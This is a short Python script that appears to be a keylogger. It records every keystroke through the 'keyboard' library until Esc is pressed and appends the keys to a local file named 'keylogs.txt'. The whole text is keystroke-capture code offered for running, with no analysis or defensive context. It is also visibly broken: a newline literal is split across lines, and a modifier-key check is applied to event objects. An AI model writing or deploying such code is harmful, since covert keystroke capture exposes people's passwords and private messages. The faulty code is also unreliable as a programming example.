import keyboard

def log_keys():
    with open('keylogs.txt', 'a') as file:
        try:
            for key in keyboard.record(until='esc'):
                if keyboard.is_modifier_key(key):
                    formatted_key = f'[{key}]'
                else:
                    formatted_key = str(key)
                print(formatted_key, end='')
                file.write(formatted_key + '
')
        except Exception as e:
            print(f'Error: {e}')

if __name__ == '__main__':
    log_keys()
